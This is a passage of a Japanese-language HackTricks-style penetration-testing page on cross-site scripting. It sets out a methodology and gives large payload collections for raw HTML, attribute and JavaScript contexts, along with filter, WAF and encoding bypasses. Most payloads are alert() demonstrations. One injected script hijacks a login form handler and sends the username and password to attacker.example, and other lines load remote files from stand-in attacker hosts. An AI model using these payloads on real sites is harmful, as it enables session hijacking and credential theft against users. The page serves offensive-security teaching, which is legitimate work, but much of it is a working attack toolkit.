# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## 方法論

1. あなたが制御できる任意の値（_parameters_, _path_, _headers_?, _cookies_?）がHTMLに**反映**されているか、あるいは**JS**コードで**使用**されているかを確認する。
2. どの**コンテキスト**で反映／使用されているかを特定する。
3. **反映されている場合**
1. 使用できる**記号（symbols）が何か**を確認し、それに応じてペイロードを準備する：
1. **raw HTML** の場合：
1. 新しい HTML タグを作成できますか？
2. `javascript:` プロトコルをサポートするイベントや属性を使えますか？
3. 保護をバイパスできますか？
4. HTML コンテンツがクライアントサイドの JS エンジン（_AngularJS_, _VueJS_, _Mavo_...）で解釈されている場合、[**Client Side Template Injection**](../client-side-template-injection-csti.md) を悪用できる可能性があります。
5. JS を実行する HTML タグを作成できない場合、[**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html) を悪用できるか確認する。
2. **HTML tag** の内部：
1. raw HTML コンテキストへ抜けられますか？
2. JS を実行するための新しいイベント／属性を作成できますか？
3. 捕まっている属性は JS 実行をサポートしていますか？
4. 保護をバイパスできますか？
3. **JavaScript code** の内部：
1. `<script>` タグから抜け出せますか？
2. 文字列をエスケープして別の JS コードを実行できますか？
3. 入力は template literals `` 内にありますか？
4. 保護をバイパスできますか？
4. Javascript の**関数**が**実行される**場合
1. 実行する関数名を指定できることがあります。例: `?callback=alert(1)`
4. **used** の場合：
1. **DOM XSS** を悪用できる可能性があります。入力がどのように制御されているか、そしてあなたの**制御された入力がどの sink に使われているか**に注意すること。

複雑な XSS を解析する際には、次の内容が役に立つことがあります：


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## 反映された値

XSS を成功させるためにまず見つけるべきは、ウェブページに**反映されているあなたが制御する値**です。

- **Intermediately reflected**: パラメータやパスの値がウェブページに反映されている場合、**Reflected XSS** を悪用できる可能性があります。
- **Stored and reflected**: あなたが制御する値がサーバに保存され、ページにアクセスするたびに反映される場合、**Stored XSS** を悪用できる可能性があります。
- **Accessed via JS**: あなたが制御する値が JS によってアクセスされている場合、**DOM XSS** を悪用できる可能性があります。

## コンテキスト

XSS を悪用しようとする際に最初に知るべきことは、**あなたの入力がどこに反映されているか**です。コンテキストに応じて、任意の JS コードを実行する方法が変わります。

### Raw HTML

入力が**raw HTML** に**反映されている**場合、JS を実行するために何らかの **HTML tag** を悪用する必要があります: `<img , <iframe , <svg , <script` ... これは使用可能な多くのタグの一部にすぎません。\
また、[Client Side Template Injection](../client-side-template-injection-csti.md) も念頭に置いてください。

### HTMLタグの属性内

入力がタグの属性値の内部に反映されている場合、次のようなことが試せます：

1. **属性とタグから脱出する**（そうすれば raw HTML に出る）して新しい HTML タグを作成する： `"><img [...]`
2. **属性からは脱出できるがタグからは脱出できない**（`>` がエンコードされるか削除される）場合、タグに応じて JS を実行する**イベント**を作成できる： `" autofocus onfocus=alert(1) x="`
3. **属性から脱出できない**（`"` がエンコードされるか削除される）場合、どの**属性**に反映されているか、**値全体を制御しているか一部だけか**によって悪用方法が変わります。例えば、`onclick=` のようなイベントを制御できるなら、クリック時に任意のコードを実行させることができます。もう一つの興味深い例は `href` 属性で、`javascript:` プロトコルを使って任意コードを実行できます: **`href="javascript:alert(1)"`**
4. 入力が "**unexpoitable tags**" の内部に反映されている場合、`accesskey` トリックを試して脆弱性を悪用できるかもしれません（これを実行するには何らかのソーシャルエンジニアリングが必要になります）： **`" accesskey="x" onclick="alert(1)" x="`**

クラス名を制御すると Angular が XSS を実行するという奇妙な例：
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript コード内

この場合、入力は HTML ページの **`<script> [...] </script>`** タグ間、`.js` ファイル内、または **`javascript:`** プロトコルを使う属性内に反映されます:

- もし **`<script> [...] </script>`** タグの間に反映される場合、入力がどんな種類のクォート内であっても、`</script>` を注入してこのコンテキストから抜け出すことを試せます。これは、**ブラウザが最初に HTML タグをパース**してからコンテンツを処理するため機能し、注入した `</script>` タグが HTML コード内にあることに気づかれないためです。
- もし **inside a JS string** に反映され、前のトリックが効かない場合は、文字列を**抜け出し**、コードを**実行**し、JS コードを**再構築**する必要があります（エラーがあると実行されません）:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- もし template literals 内に反映される場合は、`${ ... }` 構文を使って **embed JS expressions** できます: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** は **valid javascript code** を書くのに使えます:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting は、**使用後に関数、変数、またはクラスを宣言できる機会を指し、未宣言の変数や関数を使用している XSS のシナリオを悪用できる**ことを意味します。\
**詳細は以下のページを参照してください：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

多くのウェブページには、**実行する関数名をパラメータとして受け取る**エンドポイントがあります。よく見かける例は `?callback=callbackFunc` のようなものです。

ユーザーから直接与えられた値が実行されようとしているかを確認する良い方法は、**パラメータ値を変更する**（例：'Vulnerable' にする）ことと、コンソールで以下のようなエラーが出るかを確認することです：

![](<../../images/image (711).png>)

脆弱であれば、値に **`?callback=alert(1)`** を送るだけで **alert をトリガー** できる場合があります。しかし、これらのエンドポイントは一般的に、文字、数字、ドット、アンダースコアのみを許可するように **コンテンツを検証** することが多いです（**`[\w\._]`**）。

しかし、その制限があってもいくつかの操作は可能です。これは、許可された文字を使用して **DOM 内の任意の要素にアクセス** できるためです：

![](<../../images/image (747).png>)

これに便利な関数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger Javascript functions** directly: `obj.sales.delOrders`.

しかし、通常、指定された関数を実行するエンドポイントはあまり興味深い DOM を持たないことが多く、**other pages in the same origin** の方がより多くの操作を行うために**より興味深い DOM**を持っていることがあります。

したがって、**別の DOM でこの脆弱性を悪用する**ために、**Same Origin Method Execution (SOME)** のエクスプロイト手法が開発されました:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

**JS code** が `location.href` のような **攻撃者が制御するデータ** を**安全でない方法で**使用している場合があります。攻撃者はこれを悪用して任意の JS コードを実行できます。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

この種の XSS は**どこにでも**見つかり得ます。これらは単に Web アプリケーションのクライアント側の悪用に依存するだけでなく、**任意の** **コンテキスト** に依存します。これらの**任意の JavaScript 実行**は、**RCE** を取得したり、クライアントやサーバー上の**任意のファイルを読み取る**などにも悪用され得ます。\
いくつかの**例**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

入力が **HTML ページ内に反映される** 場合、またはこのコンテキストで HTML コードをエスケープして注入できる場合、まず行うべきことは `<` を使って新しいタグを作れるかどうかを確認することです。まずその**文字**が**反映されるか**を試し、それが **HTML encoded** されているのか **削除** されているのか、あるいは**変更なしで反映されている**のかを確認してください。**最後の場合にのみこのケースを悪用できます**。\
この場合は [**Client Side Template Injection**](../client-side-template-injection-csti.md) も**念頭に置いて**ください。\
_**注: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_ 

In this case and if no black/whitelisting is used, you could use payloads like:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
ただし、tags/attributes black/whitelisting が使用されている場合、作成できる **brute-force which tags** を特定する必要があります。\  
許可されている **located which tags are allowed** を見つけたら、見つかった有効なタグ内で **brute-force attributes/events** を実行し、どのようにコンテキストを攻撃できるかを確認する必要があります。

### タグ/イベント brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### カスタムタグ

有効な HTML タグが見つからない場合、**create a custom tag** を試して、`onfocus` 属性で JS コードを実行することができます。XSS リクエストでは、URL を `#` で終わらせてページをそのオブジェクトに **focus on that object** させ、コードを **execute** させる必要があります：
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

もし何らかの blacklist が使用されているなら、いくつかの簡単なトリックで回避を試みることができます:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **異なる環境向けの tiny XSS** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) および [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

脆弱性を悪用するために事前に入力されたデータを含む**ユーザーがリンクやフォームをクリックする必要がある**場合は、[**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)（ページが脆弱な場合）を試してみてください。

### Impossible - Dangling Markup

もし**HTMLタグに属性を付けてJSコードを実行することは不可能だ**と考えるなら、[**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) を確認してください。JSコードを実行せずに脆弱性を**悪用**できる可能性があります。

## HTMLタグ内への注入

### タグ内 / 属性値からのエスケープ

もし**HTMLタグの内部にいる**なら、最初に試すべきはタグから**エスケープ**して[previous section](#injecting-inside-raw-html)で述べたいくつかの手法を使いJSコードを実行することです。\
もしタグから**エスケープできない**場合は、タグ内に新しい属性を作成してJSコードを実行しようとすることができます。例えば次のようなペイロードを使います（_この例では属性からエスケープするためにダブルクオートを使用しています。入力がタグ内にそのまま反映される場合は不要です_）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**スタイルイベント**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内で

たとえ属性から**エスケープできない**（`"` がエンコードまたは削除される）場合でも、あなたの値が反映される**どの属性か**、そして**値全体を制御しているか一部だけか**によってはそれを悪用できます。例えば、`onclick=` のようなイベントを制御できれば、クリック時に任意のコードを実行させることができます。\
もう一つの興味深い**例**は `href` 属性で、`javascript:` プロトコルを使って任意のコードを実行できます：**`href="javascript:alert(1)"`**

**HTMLエンコード/URLエンコードを使ったイベント内のバイパス**

HTMLタグの属性値内にある**HTMLエンコードされた文字**は**実行時にデコードされます**。したがって、以下のようなものが有効になります（ペイロードは太字）： `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

**あらゆる種類のHTMLエンコードが有効である**ことに注意：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意: URL encode も有効です:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**イベント内での Bypass（Unicode encode を使用）**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内の特殊プロトコル

ここでは一部の場所でプロトコル **`javascript:`** や **`data:`** を使って **任意のJSコードを実行** できます。場所によってはユーザー操作が必要なものもあれば、不要なものもあります。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**これらのプロトコルを注入できる場所**

**一般的に** `javascript:` プロトコルは **`href` 属性を許容する任意のタグで使用でき**、および **`src` 属性を許容するほとんどのタグでも使用できます**（ただし `<img>` は除く）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**その他の難読化手法**

_**この場合、前のセクションで説明した HTML エンコーディングと Unicode エンコーディングのトリックも、属性内にいるため有効です。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
さらに、これらのケースには別の**良いトリック**があります: **`javascript:...` 内の入力が URL encoded されていても、実行される前に URL decoded されます。** したがって、**single quote** を使って **string** から **escape** する必要があり、かつそれが **it's being URL encoded** と確認できる場合でも、**it doesn't matter,** 実行時にそれは **single quote** として **interpreted** されます。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意: どの順序で `URLencode + HTMLencode` を**両方使用**して **payload** をエンコードしようとしても **動作しません**、ただし **payload 内で混在させる**ことはできます。

**Hex and Octal encode を `javascript:` で使用する**

`iframe` の `src` 属性内（少なくとも）で **Hex** と **Octal encode** を使用して **HTML tags to execute JS** を宣言できます:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
任意のURLを任意の **`<a href=`** タグに注入でき、そのタグが **`target="_blank" and rel="opener"`** 属性を含む場合、この挙動を悪用するために以下のページを確認してください：

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### "on" イベントハンドラのバイパス

まずこのページ（[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）を確認して、便利な **"on" event handlers** を参照してください。\
ブラックリスト等でこれらのイベントハンドラを作成できない場合は、以下のバイパスを試してください：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### 「Unexploitable tags」における XSS (hidden input, link, canonical, meta)

From [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **現在、hidden inputs を悪用して以下のことが可能になりました：**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
そして **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
以下は [**here**](https://portswigger.net/research/xss-in-hidden-input-fields) の内容です：

**XSS payload inside a hidden attribute**を実行できます。条件は、**persuade**して**victim**に**key combination**を押させることです。Firefox の Windows/Linux ではキーの組み合わせは **ALT+SHIFT+X**、OS X では **CTRL+ALT+X** です。access key attribute に別のキーを設定することで、異なるキー組み合わせを指定できます。ベクターは次の通りです：
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS ペイロードは次のようになります: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

このセクションではすでにさまざまなエンコーディングを使ったいくつかのトリックが示されています。戻って、**どこで使用できるかを学んでください：**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Read the[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Read the J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

もしページのごく一部で**XSS**を見つけ、インタラクションが必要な場合（例: フッターの onmouseover を持つ小さなリンク）、要素が占有する領域を**変更**してリンクが発火する確率を高めることができます。

例えば、要素に次のようなスタイルを追加できます: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

しかし、WAF が style 属性をフィルタしている場合は、CSS Styling Gadgets を使えます。例えば次のようなスタイルが見つかると

> .test {display:block; color: blue; width: 100%\}

and

> \#someid {top: 0; font-family: Tahoma;}

このとき、リンクを次の形に変更できます

> \<a href="" id=someid class=test onclick=alert() a="">

この手法は次の記事から引用: [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

この場合、あなたの**入力**は**JS コード内に反映されます**—`.js` ファイル内、`<script>...</script>` タグ内、JS を実行する HTML イベント間、または `javascript:` プロトコルを受け付ける属性間に反映されます。

### <script> タグのエスケープ

もしコードが `<script> [...] var input = 'reflected data' [...] </script>` のように挿入されている場合、簡単に `<script>` の終了を**エスケープして閉じることができます**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
この例では **シングルクォートを閉じてすらいません**。これは **HTML のパースがブラウザによって最初に行われる** ためで、script ブロックを含むページ要素の識別が行われます。埋め込まれたスクリプトを理解して実行するための JavaScript のパースは、その後で初めて行われます。

### JS コード内

もし `<>` がサニタイズされている場合でも、入力が**配置されている**文字列を**エスケープ**して**任意の JS を実行**できます。JS の構文を**修正する**ことが重要です。もしエラーがあれば、JS コードは実行されません：
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

ユーザー入力が引用されたJavaScript文字列内に入る場合（例: server-side echo into an inline script）、文字列を終了させてコードを注入し、構文を修復してパースを有効なままにできます。一般的なスケルトン:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
脆弱なパラメータがJS文字列内に反射される場合の例となるURLパターン:
```
?param=test";<INJECTION>;a="
```
これはHTMLコンテキストに触れることなく攻撃者のJSを実行します（純粋なJS-in-JS）。フィルタがキーワードをブロックする場合は、下のblacklist bypassesと組み合わせてください。

### テンプレートリテラル ``

単一引用符や二重引用符以外に**文字列**を構築する手段として、JSは**backticks**（**` `` `**）も受け付けます。これはテンプレートリテラルと呼ばれ、`${ ... }`構文を使って**JS式を埋め込む**ことができます。\
したがって、入力がbackticksを使用したJS文字列内に**反射**されている場合、`${ ... }`構文を悪用して**任意のJSコード**を実行できます:

これは次のように**悪用**できます:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### エンコードされたコードの実行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads with eval(atob()) and scope nuances

URLを短くし、単純なキーワードフィルタを回避するために、実際のロジックをbase64エンコードして`eval(atob('...'))`で評価できます。単純なキーワードフィルタが`alert`、`eval`、`atob`のような識別子をブロックする場合は、ブラウザ上で同等にコンパイルされるが文字列照合フィルタを回避するUnicodeエスケープされた識別子を使用してください：
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要なスコーピングの注意点: `const`/`let` が `eval()` 内で宣言されるとブロックスコープになり、globals を作成しません。後のスクリプトからはアクセスできません。必要に応じて（例: to hijack a form handler）グローバルで再代入不可のフックを定義するには、動的に挿入した `<script>` 要素を使用してください:
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
参照: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode エンコードによる JS 実行
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript ブラックリスト回避テクニック

**文字列**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊なエスケープ**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JSコード内でのスペースの置換**
```javascript
<TAB>
/**/
```
**JavaScript comments (**[**JavaScript Comments**](#javascript-comments)**のトリック)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines ([**JavaScript new line**](#javascript-new-lines) のトリック)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript の空白文字**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**コメント内の Javascript**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**括弧なしの JavaScript**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
